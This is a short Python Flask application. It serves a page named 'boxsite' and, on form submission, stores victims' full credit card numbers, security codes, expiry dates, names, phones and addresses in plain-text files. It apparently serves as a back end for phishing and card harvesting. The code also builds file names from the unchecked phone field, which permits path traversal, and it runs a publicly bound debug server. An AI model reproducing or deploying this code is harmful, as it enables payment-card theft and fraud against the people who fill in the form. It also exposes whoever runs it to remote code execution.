from flask import Flask, render_template, request
import os

app = Flask(__name__)

# Define the directory to save submissions
SUBMISSIONS_DIR = 'submissions'

if not os.path.exists(SUBMISSIONS_DIR):
    os.makedirs(SUBMISSIONS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/boxsite')
def boxsite():
    return render_template('boxsite.html')

@app.route('/submit', methods=['POST'])
def submit():
    card_number = request.form.get('card_number')
    name = request.form.get('name')
    expiration_date = request.form.get('expiration_date')
    security_code = request.form.get('security_code')
    phone = request.form.get('phone')
    address = request.form.get('address')

    data = (
        f"Credit Card Number: {card_number}\n"
        f"Name on Card: {name}\n"
        f"Expiration Date: {expiration_date}\n"
        f"Security Code: {security_code}\n"
        f"Phone Number: {phone}\n"
        f"Address: {address}\n"
    )

    filename = os.path.join(SUBMISSIONS_DIR, f'{phone}.txt')

    with open(filename, 'w') as file:
        file.write(data)

    return 'Form submitted successfully!'

if __name__ == '__main__':
    # Bind to 0.0.0.0 to make the Flask app accessible externally
    app.run(host='0.0.0.0', port=5000, debug=True)
